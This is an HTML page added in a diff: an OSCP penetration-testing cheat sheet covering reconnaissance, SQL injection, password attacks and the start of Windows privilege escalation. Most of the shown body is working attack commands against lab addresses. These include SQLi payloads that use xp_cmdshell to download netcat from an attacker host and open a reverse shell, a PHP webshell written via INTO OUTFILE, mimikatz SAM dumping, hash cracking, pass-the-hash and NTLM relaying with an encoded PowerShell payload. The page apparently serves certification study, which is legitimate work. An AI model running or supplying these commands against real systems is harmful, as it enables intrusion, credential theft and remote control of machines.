@@ -1,0 +1,1607 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<title>oscp_cheatsheet</title>
+
+
+<style type="text/css">
+body {
+  font-family: Helvetica, arial, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  padding-top: 10px;
+  padding-bottom: 10px;
+  background-color: white;
+  padding: 30px; }
+
+body > *:first-child {
+  margin-top: 0 !important; }
+body > *:last-child {
+  margin-bottom: 0 !important; }
+
+a {
+  color: #4183C4; }
+a.absent {
+  color: #cc0000; }
+a.anchor {
+  display: block;
+  padding-left: 30px;
+  margin-left: -30px;
+  cursor: pointer;
+  position: absolute;
+  top: 0;
+  left: 0;
+  bottom: 0; }
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+  cursor: text;
+  position: relative; }
+
+h1:hover a.anchor, h2:hover a.anchor, h3:hover a.anchor, h4:hover a.anchor, h5:hover a.anchor, h6:hover a.anchor {
+  background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA09pVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoMTMuMCAyMDEyMDMwNS5tLjQxNSAyMDEyLzAzLzA1OjIxOjAwOjAwKSAgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6OUM2NjlDQjI4ODBGMTFFMTg1ODlEODNERDJBRjUwQTQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6OUM2NjlDQjM4ODBGMTFFMTg1ODlEODNERDJBRjUwQTQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo5QzY2OUNCMDg4MEYxMUUxODU4OUQ4M0REMkFGNTBBNCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo5QzY2OUNCMTg4MEYxMUUxODU4OUQ4M0REMkFGNTBBNCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PsQhXeAAAABfSURBVHjaYvz//z8DJYCRUgMYQAbAMBQIAvEqkBQWXI6sHqwHiwG70TTBxGaiWwjCTGgOUgJiF1J8wMRAIUA34B4Q76HUBelAfJYSA0CuMIEaRP8wGIkGMA54bgQIMACAmkXJi0hKJQAAAABJRU5ErkJggg==) no-repeat 10px center;
+  text-decoration: none; }
+
+h1 tt, h1 code {
+  font-size: inherit; }
+
+h2 tt, h2 code {
+  font-size: inherit; }
+
+h3 tt, h3 code {
+  font-size: inherit; }
+
+h4 tt, h4 code {
+  font-size: inherit; }
+
+h5 tt, h5 code {
+  font-size: inherit; }
+
+h6 tt, h6 code {
+  font-size: inherit; }
+
+h1 {
+  font-size: 28px;
+  color: black; }
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #cccccc;
+  color: black; }
+
+h3 {
+  font-size: 18px; }
+
+h4 {
+  font-size: 16px; }
+
+h5 {
+  font-size: 14px; }
+
+h6 {
+  color: #777777;
+  font-size: 14px; }
+
+p, blockquote, ul, ol, dl, li, table, pre {
+  margin: 15px 0; }
+
+hr {
+  background: transparent url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAYAAAAECAYAAACtBE5DAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBNYWNpbnRvc2giIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6OENDRjNBN0E2NTZBMTFFMEI3QjRBODM4NzJDMjlGNDgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6OENDRjNBN0I2NTZBMTFFMEI3QjRBODM4NzJDMjlGNDgiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo4Q0NGM0E3ODY1NkExMUUwQjdCNEE4Mzg3MkMyOUY0OCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo4Q0NGM0E3OTY1NkExMUUwQjdCNEE4Mzg3MkMyOUY0OCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqqezsUAAAAfSURBVHjaYmRABcYwBiM2QSA4y4hNEKYDQxAEAAIMAHNGAzhkPOlYAAAAAElFTkSuQmCC) repeat-x 0 0;
+  border: 0 none;
+  color: #cccccc;
+  height: 4px;
+  padding: 0;
+}
+
+body > h2:first-child {
+  margin-top: 0;
+  padding-top: 0; }
+body > h1:first-child {
+  margin-top: 0;
+  padding-top: 0; }
+  body > h1:first-child + h2 {
+    margin-top: 0;
+    padding-top: 0; }
+body > h3:first-child, body > h4:first-child, body > h5:first-child, body > h6:first-child {
+  margin-top: 0;
+  padding-top: 0; }
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0; }
+
+h1 p, h2 p, h3 p, h4 p, h5 p, h6 p {
+  margin-top: 0; }
+
+li p.first {
+  display: inline-block; }
+li {
+  margin: 0; }
+ul, ol {
+  padding-left: 30px; }
+
+ul :first-child, ol :first-child {
+  margin-top: 0; }
+
+dl {
+  padding: 0; }
+  dl dt {
+    font-size: 14px;
+    font-weight: bold;
+    font-style: italic;
+    padding: 0;
+    margin: 15px 0 5px; }
+    dl dt:first-child {
+      padding: 0; }
+    dl dt > :first-child {
+      margin-top: 0; }
+    dl dt > :last-child {
+      margin-bottom: 0; }
+  dl dd {
+    margin: 0 0 15px;
+    padding: 0 15px; }
+    dl dd > :first-child {
+      margin-top: 0; }
+    dl dd > :last-child {
+      margin-bottom: 0; }
+
+blockquote {
+  border-left: 4px solid #dddddd;
+  padding: 0 15px;
+  color: #777777; }
+  blockquote > :first-child {
+    margin-top: 0; }
+  blockquote > :last-child {
+    margin-bottom: 0; }
+
+table {
+  padding: 0;border-collapse: collapse; }
+  table tr {
+    border-top: 1px solid #cccccc;
+    background-color: white;
+    margin: 0;
+    padding: 0; }
+    table tr:nth-child(2n) {
+      background-color: #f8f8f8; }
+    table tr th {
+      font-weight: bold;
+      border: 1px solid #cccccc;
+      margin: 0;
+      padding: 6px 13px; }
+    table tr td {
+      border: 1px solid #cccccc;
+      margin: 0;
+      padding: 6px 13px; }
+    table tr th :first-child, table tr td :first-child {
+      margin-top: 0; }
+    table tr th :last-child, table tr td :last-child {
+      margin-bottom: 0; }
+
+img {
+  max-width: 100%; }
+
+span.frame {
+  display: block;
+  overflow: hidden; }
+  span.frame > span {
+    border: 1px solid #dddddd;
+    display: block;
+    float: left;
+    overflow: hidden;
+    margin: 13px 0 0;
+    padding: 7px;
+    width: auto; }
+  span.frame span img {
+    display: block;
+    float: left; }
+  span.frame span span {
+    clear: both;
+    color: #333333;
+    display: block;
+    padding: 5px 0 0; }
+span.align-center {
+  display: block;
+  overflow: hidden;
+  clear: both; }
+  span.align-center > span {
+    display: block;
+    overflow: hidden;
+    margin: 13px auto 0;
+    text-align: center; }
+  span.align-center span img {
+    margin: 0 auto;
+    text-align: center; }
+span.align-right {
+  display: block;
+  overflow: hidden;
+  clear: both; }
+  span.align-right > span {
+    display: block;
+    overflow: hidden;
+    margin: 13px 0 0;
+    text-align: right; }
+  span.align-right span img {
+    margin: 0;
+    text-align: right; }
+span.float-left {
+  display: block;
+  margin-right: 13px;
+  overflow: hidden;
+  float: left; }
+  span.float-left span {
+    margin: 13px 0 0; }
+span.float-right {
+  display: block;
+  margin-left: 13px;
+  overflow: hidden;
+  float: right; }
+  span.float-right > span {
+    display: block;
+    overflow: hidden;
+    margin: 13px auto 0;
+    text-align: right; }
+
+code, tt {
+  margin: 0 2px;
+  padding: 0 5px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px; }
+
+pre code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent; }
+
+.highlight pre {
+  background-color: #f8f8f8;
+  border: 1px solid #cccccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px; }
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #cccccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px; }
+  pre code, pre tt {
+    background-color: transparent;
+    border: none; }
+
+sup {
+    font-size: 0.83em;
+    vertical-align: super;
+    line-height: 0;
+}
+
+kbd {
+  display: inline-block;
+  padding: 3px 5px;
+  font-size: 11px;
+  line-height: 10px;
+  color: #555;
+  vertical-align: middle;
+  background-color: #fcfcfc;
+  border: solid 1px #ccc;
+  border-bottom-color: #bbb;
+  border-radius: 3px;
+  box-shadow: inset 0 -1px 0 #bbb
+}
+
+* {
+	-webkit-print-color-adjust: exact;
+}
+@media screen and (min-width: 914px) {
+    body {
+        width: 854px;
+        margin:0 auto;
+    }
+}
+@media print {
+	table, pre {
+		page-break-inside: avoid;
+	}
+	pre {
+		word-wrap: break-word;
+	}
+  body {
+    padding: 2cm; 
+  }
+}
+</style>
+
+
+</head>
+
+<body>
+
+<!-- TOC start (generated with https://github.com/derlin/bitdowntoc) -->
+
+<ul>
+<li><a href="#information-gathering">Information Gathering</a>
+
+<ul>
+<li><a href="#pasive">Pasive </a></li>
+<li><a href="#active">Active</a>
+
+<ul>
+<li><a href="#smb-enumeration">SMB Enumeration</a></li>
+<li><a href="#smtp">SMTP</a></li>
+<li><a href="#snmp">SNMP</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#sql-injection-attacks">SQL Injection Attacks</a>
+
+<ul>
+<li><a href="#identifiying-sqli-via-error-based-payloads">Identifiying SQLi via error-based payloads</a></li>
+<li><a href="#union-based-payloads">UNION-based Payloads</a></li>
+<li><a href="#blind-sql-injections">Blind SQL Injections</a></li>
+<li><a href="#manual-code-execution">Manual Code Execution</a></li>
+<li><a href="#automating-the-attack">Automating the attack</a></li>
+</ul></li>
+<li><a href="#password-attacks">Password Attacks</a>
+
+<ul>
+<li><a href="#cewl">Cewl</a></li>
+<li><a href="#password-manager">Password Manager</a></li>
+<li><a href="#ssh-private-key-passphrase">SSH Private Key Passphrase</a></li>
+<li><a href="#cracking-ntlm">Cracking NTLM</a></li>
+<li><a href="#passing-ntlm">Passing NTLM</a></li>
+<li><a href="#cracking-net-ntlmv2">Cracking Net-NTLMv2</a></li>
+<li><a href="#relaying-net-ntlmv2">Relaying Net-NTLMv2</a></li>
+</ul></li>
+<li><a href="#windows-privilege-escalation">Windows Privilege Escalation</a>
+
+<ul>
+<li><a href="#situational-awareness">Situational Awareness</a></li>
+<li><a href="#hidden-in-plain-view">Hidden in Plain View</a></li>
+<li><a href="#information-goldmine-powershell">Information Goldmine Powershell</a></li>
+<li><a href="#automated-enumeration">Automated Enumeration</a></li>
+<li><a href="#service-binary-hijacking">Service Binary Hijacking</a></li>
+<li><a href="#service-dll-hijacking">Service DLL Hijacking</a></li>
+<li><a href="#unquoted-service-paths">Unquoted Service Paths</a></li>
+<li><a href="#scheduled-tasks">Scheduled Tasks</a></li>
+<li><a href="#using-exploits">Using exploits</a></li>
+</ul></li>
+<li><a href="#linux-privilege-escalation">Linux Privilege Escalation</a>
+
+<ul>
+<li><a href="#manual-enumeration">Manual Enumeration</a></li>
+<li><a href="#automated-enumeration-1">Automated Enumeration</a></li>
+<li><a href="#insecure-file-permissions">Insecure File Permissions</a></li>
+<li><a href="#abusing-password-authentication">Abusing Password Authentication</a></li>
+<li><a href="#easy-root-shell">Easy root shell</a></li>
+<li><a href="#abusing-setuid-binaries-and-capabilities">Abusing Setuid Binaries and Capabilities</a></li>
+<li><a href="#abusing-sudo">Abusing sudo</a></li>
+<li><a href="#exploiting-kernel-vulnerabilities">Exploiting Kernel Vulnerabilities</a></li>
+</ul></li>
+<li><a href="#port-redirection-and-ssh-tunneling">Port Redirection and SSH Tunneling</a>
+
+<ul>
+<li><a href="#port-forwward-with-socat">Port Forwward with socat</a></li>
+<li><a href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></li>
+<li><a href="#ssh-dynamic-port-forwarding">SSH Dynamic Port Forwarding</a></li>
+<li><a href="#ssh-remote-port-forwarding">SSH Remote Port Forwarding</a></li>
+<li><a href="#ssh-remote-dynamic-port-forwarding">SSH Remote Dynamic Port Forwarding</a></li>
+<li><a href="#using-sshuttle">Using sshuttle</a></li>
+<li><a href="#port-forwarding-with-windows-tools">Port Forwarding with Windows Tools</a>
+
+<ul>
+<li><a href="#sshexe">ssh.exe</a></li>
+<li><a href="#plink">Plink</a></li>
+<li><a href="#netsh">Netsh</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#tunneling-through-deep-packet-inspection">Tunneling Through Deep Packet Inspection</a>
+
+<ul>
+<li><a href="#http-tunneling-with-chisel">HTTP Tunneling with Chisel</a></li>
+<li><a href="#dns-tunneling-with-dnscat2">DNS Tunneling with dnscat2</a></li>
+<li><a href="#ligolo">Ligolo</a></li>
+</ul></li>
+<li><a href="#metasploit">Metasploit</a></li>
+<li><a href="#active-directory-introduction-and-enumeration">Active Directory Introduction and Enumeration</a>
+
+<ul>
+<li><a href="#manual-enumeration-expanding-our-repertoire">Manual Enumeration - Expanding our Repertoire</a></li>
+<li><a href="#active-directory-automated-enumeration">Active Directory - Automated Enumeration</a></li>
+</ul></li>
+<li><a href="#attacking-active-directory-authentication">Attacking Active Directory Authentication</a>
+
+<ul>
+<li><a href="#password-attacks-1">Password Attacks</a></li>
+<li><a href="#as-rep-roasting">AS-REP Roasting</a></li>
+<li><a href="#kerberoasting">Kerberoasting</a></li>
+<li><a href="#silver-tickets">Silver Tickets</a></li>
+<li><a href="#domain-controller-synchronization">Domain Controller Synchronization</a></li>
+</ul></li>
+<li><a href="#lateral-movement-in-active-directory">Lateral Movement in Active Directory</a>
+
+<ul>
+<li><a href="#wmi-and-winrm">WMI and WinRM</a></li>
+<li><a href="#psexec">PsExec </a></li>
+<li><a href="#pass-the-hash">Pass the Hash</a></li>
+<li><a href="#overpass-the-hash">Overpass the Hash</a></li>
+<li><a href="#pass-the-ticket">Pass the Ticket</a></li>
+<li><a href="#dcom">DCOM</a></li>
+<li><a href="#golden-ticket">Golden Ticket</a></li>
+<li><a href="#shadow-copies">Shadow Copies</a></li>
+</ul></li>
+<li><a href="#miscelanea">Miscelanea</a>
+
+<ul>
+<li><a href="#linux-spawning-shell">Linux spawning shell</a></li>
+<li><a href="#password-spraying">Password Spraying</a></li>
+<li><a href="#dump-git-branches">Dump git branches</a></li>
+<li><a href="#reverse-shell-using-certutil">Reverse shell using certutil</a></li>
+<li><a href="#send-email">Send email</a></li>
+<li><a href="#transfer-files">Transfer files</a>
+
+<ul>
+<li><a href="#smb">SMB</a></li>
+<li><a href="#rdp-mounting-shared-folder">RDP mounting shared folder</a></li>
+<li><a href="#using-rdesktop">Using rdesktop</a></li>
+<li><a href="#impacket-tools">Impacket tools</a></li>
+<li><a href="#evil-winrm">Evil-winrm</a></li>
+<li><a href="#c2-frameworks">C2 frameworks</a></li>
+<li><a href="#ftp">FTP</a></li>
+</ul></li>
+</ul></li>
+</ul>
+
+<!-- TOC end -->
+
+<p><!-- TOC --><a name="information-gathering"></a></p>
+
+<h1 id="toc_0">Information Gathering</h1>
+
+<p><!-- TOC --><a name="pasive"></a></p>
+
+<h2 id="toc_1">Pasive</h2>
+
+<p><code>kali@kali:~$ whois megacorpone.com -h 192.168.50.251</code>
+Google, Netcraft, Gitleaks, Gitrob, Shodan, Security Headers</p>
+
+<p><!-- TOC --><a name="active"></a></p>
+
+<h2 id="toc_2">Active</h2>
+
+<p><code>kali@kali:~$ host www.megacorpone.com</code>
+<code>kali@kali:~$ host -t mx megacorpone.com</code>
+<code>kali@kali:~$ cat list.txt</code></p>
+
+<div><pre><code class="language-none">www
+ftp
+mail
+owa
+proxy
+router</code></pre></div>
+
+<p><code>kali@kali:~$ for ip in $(cat list.txt); do host $ip.megacorpone.com; done</code>
+<code>kali@kali:~$ nc -nvv -w 1 -z 192.168.50.152 3388-3390</code>
+<code>kali@kali:~$ nc -nv -u -z -w 1 192.168.50.149 120-123</code>
+<code>kali@kali:~$ sudo nmap -sS 192.168.50.149</code>
+<code>kali@kali:~$ nmap -sT 192.168.50.149</code>
+<code>kali@kali:~$ sudo nmap -sU 192.168.50.149</code>
+<code>kali@kali:~$ sudo nmap -sU -sS 192.168.50.149</code>
+<code>kali@kali:~$ nmap -sn 192.168.50.1-253</code>
+<code>kali@kali:~$ nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt</code>
+<code>kali@kali:~$ grep Up ping-sweep.txt | cut -d &quot; &quot; -f 2</code>
+<code>kali@kali:~$ nmap -p 80 192.168.50.1-253 -oG web-sweep.txt</code>
+<code>kali@kali:~$ grep open web-sweep.txt | cut -d&quot; &quot; -f2</code>
+<code>kali@kali:~$ nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt</code></p>
+
+<p><!-- TOC --><a name="smb-enumeration"></a></p>
+
+<h3 id="toc_3">SMB Enumeration</h3>
+
+<p><code>kali@kali:~$ sudo nbtscan -r 192.168.50.0/24</code>
+<code>kali@kali:~$ ls -1 /usr/share/nmap/scripts/smb*</code>
+<code>kali@kali:~$ nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152</code>
+<code>C:\&gt; net view \\dc01 /all</code></p>
+
+<p><!-- TOC --><a name="smtp"></a></p>
+
+<h3 id="toc_4">SMTP</h3>
+
+<p><code>kali@kali:~$ nc -nv 192.168.50.8 25</code></p>
+
+<div><pre><code class="language-none">VRFY root</code></pre></div>
+
+<p><!-- TOC --><a name="snmp"></a></p>
+
+<h3 id="toc_5">SNMP</h3>
+
+<p><code>kali@kali:~$ echo public &gt; community</code>
+<code>kali@kali:~$ echo private &gt;&gt; community</code>
+<code>kali@kali:~$ echo manager &gt;&gt; community</code>
+<code>kali@kali:~$ for ip in $(seq 1 254); do echo 192.168.50.$ip; done &gt; ips</code>
+<code>kali@kali:~$ onesixtyone -c community -i ips</code>
+<code>kali@kali:~$ snmpwalk -v1 -c public 192.168.219.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull</code>
+<code>kali@kali:~$ snmpwalk -v1 -c public 192.168.219.156 .1 &gt; snmp.txt</code></p>
+
+<p><!-- TOC --><a name="sql-injection-attacks"></a></p>
+
+<h1 id="toc_6">SQL Injection Attacks</h1>
+
+<p><!-- TOC --><a name="identifiying-sqli-via-error-based-payloads"></a></p>
+
+<h2 id="toc_7">Identifiying SQLi via error-based payloads</h2>
+
+<p><code>offsec&#39; OR 1=1 -- //</code>
+<code>&#39; or 1=1 in (select @@version) -- //</code>
+<code>&#39; OR 1=1 in (SELECT * FROM users) -- //</code>
+<code>&#39; or 1=1 in (SELECT password FROM users) -- //</code>
+<code>&#39; or 1=1 in (SELECT password FROM users WHERE username = &#39;admin&#39;) -- //</code></p>
+
+<p><!-- TOC --><a name="union-based-payloads"></a></p>
+
+<h2 id="toc_8">UNION-based Payloads</h2>
+
+<p><code>&#39; ORDER BY 1-- //</code>
+<code>%&#39; UNION SELECT database(), user(), @@version, null, null -- //</code>
+<code>&#39; UNION SELECT null, null, database(), user(), @@version  -- //</code>
+<code>&#39; union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //</code></p>
+
+<p><!-- TOC --><a name="blind-sql-injections"></a></p>
+
+<h2 id="toc_9">Blind SQL Injections</h2>
+
+<p><code>http://192.168.50.16/blindsqli.php?user=offsec&#39; AND 1=1 -- //</code>
+<code>http://192.168.50.16/blindsqli.php?user=offsec&#39; AND IF (1=1, sleep(3),&#39;false&#39;) -- //</code></p>
+
+<p><!-- TOC --><a name="manual-code-execution"></a></p>
+
+<h2 id="toc_10">Manual Code Execution</h2>
+
+<p><code>&#39;; EXECUTE sp_configure &#39;show advanced options&#39;, 1; --</code>
+<code>&#39;; RECONFIGURE; --</code>
+<code>&#39;; EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1; --</code>
+<code>&#39;; RECONFIGURE; --</code>
+<code>&#39;; EXECUTE xp_cmdshell &quot;powershell.exe wget http://192.168.45.181:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe&quot;;-- &#39;;</code>
+<code>&#39;; EXECUTE xp_cmdshell &quot;c:\\Users\Public\\nc.exe -e cmd.exe 192.168.45.181 4444&quot;;-- &#39;;</code>
+<code>&#39; UNION SELECT &quot;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&quot;, null, null, null, null INTO OUTFILE &quot;/var/www/html/tmp/webshell.php&quot; -- //</code></p>
+
+<p><!-- TOC --><a name="automating-the-attack"></a></p>
+
+<h2 id="toc_11">Automating the attack</h2>
+
+<p><code>kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user</code>
+<code>kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump</code>
+<code>kali@kali:~$ sqlmap -r post.txt -p item  --os-shell  --web-root &quot;/var/www/html/tmp&quot;</code></p>
+
+<p><!-- TOC --><a name="password-attacks"></a></p>
+
+<h1 id="toc_12">Password Attacks</h1>
+
+<p><!-- TOC --><a name="cewl"></a></p>
+
+<h2 id="toc_13">Cewl</h2>
+
+<p><code>kali@kali:~$ cewl http://192.168.164.61:8081/ | grep -v CeWL &gt; custom-wordlist.txt</code></p>
+
+<p><!-- TOC --><a name="password-manager"></a></p>
+
+<h2 id="toc_14">Password Manager</h2>
+
+<p><code>PS C:\&gt; Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue</code>
+<code>kali@kali:~$ keepass2john Database.kdbx &gt; keepass.hash</code>
+<code>kali@kali:~$ hashcat --help | grep -i &quot;KeePass&quot;</code>
+<code>kali@kali:~$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force</code></p>
+
+<p><!-- TOC --><a name="ssh-private-key-passphrase"></a></p>
+
+<h2 id="toc_15">SSH Private Key Passphrase</h2>
+
+<p><code>kali@kali:~$ chmod 600 id_rsa</code>
+<code>kali@kali:~$ ssh -i id_rsa -p 2222 dave@192.168.50.201</code>
+<code>kali@kali:~$ ssh2john id_rsa &gt; ssh.hash</code></p>
+
+<p><!-- TOC --><a name="cracking-ntlm"></a></p>
+
+<h2 id="toc_16">Cracking NTLM</h2>
+
+<p><code>PS C:\&gt; Get-LocalUser</code></p>
+
+<p><code>PS C:\&gt; .\mimikatz.exe</code></p>
+
+<div><pre><code class="language-none">privilege::debug
+token::elevate
+lsadump::sam</code></pre></div>
+
+<p><code>kali@kali:~$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></p>
+
+<p><!-- TOC --><a name="passing-ntlm"></a></p>
+
+<h2 id="toc_17">Passing NTLM</h2>
+
+<p><code>kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b</code></p>
+
+<p><code>kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212</code></p>
+
+<p><code>kali@kali:~$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212</code></p>
+
+<p><!-- TOC --><a name="cracking-net-ntlmv2"></a></p>
+
+<h2 id="toc_18">Cracking Net-NTLMv2</h2>
+
+<p><code>kali@kali:~$ sudo responder -I tap0 
+C:\&gt; dir \\IP_Kali\test</code>
+<code>kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force</code></p>
+
+<p><!-- TOC --><a name="relaying-net-ntlmv2"></a></p>
+
+<h2 id="toc_19">Relaying Net-NTLMv2</h2>
+
+<p><code>kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t IP_Target -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</code>
+<code>C:\&gt;dir \\IP_Kali\test</code></p>
+
+<blockquote>
+<p>when finding backup SAM and SYSTEM files in windows.old/Windows/system32</p>
+</blockquote>
+
+<p><code>kali@kali:~$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL &gt; SAMhashes</code></p>
+
+<blockquote>
+<p>dont use samdump2. It ouputs wrong hashes</p>
+</blockquote>
+
+<p><!-- TOC --><a name="windows-privilege-escalation"></a></p>
+
+<h1 id="toc_20">Windows Privilege Escalation</h1>
+
+<p><!-- TOC --><a name="situational-awareness"></a></p>
+
+<h2 id="toc_21">Situational Awareness</h2>
+
+<p><code>C:\&gt; whoami /groups</code>
+<code>PS C:\&gt; Get-LocalUser</code>
+<code>PS C:\&gt; Get-LocalGroup</code>
+<code>PS C:\&gt; Get-LocalGroupMember Administrators</code>
+<code>C:\&gt; systeminfo</code>
+<code>C:\&gt; ipconfig /all</code>
+<code>C:\&gt; route print</code>
+<code>C:\&gt; netstat -ano</code></p>
+
+<p><!-- TOC --><a name="hidden-in-plain-view"></a></p>
+
+<h2 id="toc_22">Hidden in Plain View</h2>
+
+<p><code>PS C:\&gt; Get-ItemProperty &quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select displayname</code>
+<code>PS C:\&gt; Get-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select displayname</code>
+<code>PS C:\&gt; Get-Process</code>
+<code>PS C:\&gt; Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue</code>
+<code>PS C:\&gt; Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue</code>
+<code>PS C:\&gt; Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue</code>
+<code>C:\&gt; net user steve</code>
+<code>C:\&gt; runas /user:backupadmin cmd</code></p>
+
+<p><!-- TOC --><a name="information-goldmine-powershell"></a></p>
+
+<h2 id="toc_23">Information Goldmine Powershell</h2>
+
+<p><code>PS C:\&gt; Get-History</code>
+<code>PS C:\&gt; (Get-PSReadlineOption).HistorySavePath</code>
+<code>kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p &quot;qwertqwertqwert123\!\!&quot;</code></p>
+
+<p><!-- TOC --><a name="automated-enumeration"></a></p>
+
+<h2 id="toc_24">Automated Enumeration</h2>
+
+<p><code>PS C:\&gt; iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe</code></p>
+
+<blockquote>
+<p>winPEAS may falsely detect Windows 11 as Windows 10</p>
+</blockquote>
+
+<p><!-- TOC --><a name="service-binary-hijacking"></a></p>
+
+<h2 id="toc_25">Service Binary Hijacking</h2>
+
